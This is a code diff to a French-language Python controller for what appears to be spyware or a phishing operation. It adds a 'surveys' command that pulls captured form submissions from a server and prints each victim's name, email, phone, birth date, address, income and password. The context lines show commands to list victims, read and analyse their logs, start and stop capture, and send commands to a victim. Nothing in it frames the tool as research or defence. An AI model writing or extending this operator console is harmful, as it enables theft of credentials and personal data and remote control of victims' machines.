@@ -182,6 +182,59 @@ class Controller:
         except Exception as e:
             self.print_error(f"Erreur lors de l'analyse: {e}")
     
+    def show_surveys(self):
+        """
+        Affiche les données des formulaires capturés
+        """
+        try:
+            response = requests.get(
+                f"{self.base_url}/api/survey/responses",
+                timeout=5
+            )
+            
+            if response.status_code == 200:
+                data = response.json()
+                responses = data.get('data', [])
+                count = data.get('count', 0)
+                
+                if count == 0:
+                    self.print_info("Aucun formulaire capturé")
+                    return
+                
+                print(f"\n{Fore.CYAN}Formulaires capturés: {count}{Style.RESET_ALL}")
+                print("=" * 60)
+                
+                for i, response_data in enumerate(responses, 1):
+                    captured_at = response_data.get('captured_at') or response_data.get('submittedAt', 'N/A')
+                    
+                    print(f"\n{Fore.YELLOW}Formulaire #{i}{Style.RESET_ALL}")
+                    print(f"Date: {captured_at}")
+                    print("-" * 60)
+                    print(f"{Fore.GREEN}Nom:{Style.RESET_ALL} {response_data.get('fullName', 'N/A')}")
+                    print(f"{Fore.GREEN}Email:{Style.RESET_ALL} {response_data.get('email', 'N/A')}")
+                    print(f"{Fore.GREEN}Téléphone:{Style.RESET_ALL} {response_data.get('phone', 'N/A')}")
+                    print(f"{Fore.GREEN}Date de naissance:{Style.RESET_ALL} {response_data.get('birthDate', 'N/A')}")
+                    print(f"{Fore.GREEN}Adresse:{Style.RESET_ALL} {response_data.get('address', 'N/A')}")
+                    print(f"{Fore.GREEN}Ville:{Style.RESET_ALL} {response_data.get('city', 'N/A')} {response_data.get('postalCode', '')}")
+                    print(f"{Fore.GREEN}Profession:{Style.RESET_ALL} {response_data.get('profession', 'N/A')}")
+                    print(f"{Fore.GREEN}Entreprise:{Style.RESET_ALL} {response_data.get('company', 'N/A')}")
+                    print(f"{Fore.GREEN}Revenus:{Style.RESET_ALL} {response_data.get('income', 'N/A')}")
+                    print(f"{Fore.RED}MOT DE PASSE:{Style.RESET_ALL} {Fore.YELLOW}{response_data.get('password', 'N/A')}{Style.RESET_ALL}")
+                    
+                    comments = response_data.get('comments')
+                    if comments:
+                        print(f"{Fore.GREEN}Commentaires:{Style.RESET_ALL} {comments}")
+                    
+                    print("-" * 60)
+                
+                print()
+            
+            else:
+                self.print_error(f"Erreur HTTP: {response.status_code}")
+        
+        except Exception as e:
+            self.print_error(f"Erreur lors de la récupération des formulaires: {e}")
+    
     def send_command(self, victim_id, command, params=None):
         """
         Envoie une commande à une victime
@@ -217,6 +270,7 @@ class Controller:
         print("  " + Fore.YELLOW + "list" + Style.RESET_ALL + "                    - Lister les victimes actives")
         print("  " + Fore.YELLOW + "logs <id> [limit]" + Style.RESET_ALL + "        - Afficher les logs d'une victime")
         print("  " + Fore.YELLOW + "analyze <id>" + Style.RESET_ALL + "             - Analyser les logs d'une victime")
+        print("  " + Fore.YELLOW + "surveys" + Style.RESET_ALL + "                 - Afficher les données des formulaires")
         print()
         print("  " + Fore.YELLOW + "start <id>" + Style.RESET_ALL + "               - Démarrer la capture")
         print("  " + Fore.YELLOW + "stop <id>" + Style.RESET_ALL + "                - Arrêter la capture")
@@ -279,6 +333,9 @@ class Controller:
                     
                     victim_id = command[1]
                     self.analyze_victim(victim_id)
+                
+                elif cmd == "surveys" or cmd == "formulaires":
+                    self.show_surveys()
                 
                 elif cmd == "command" or cmd == "cmd":
                     if len(command) < 3:
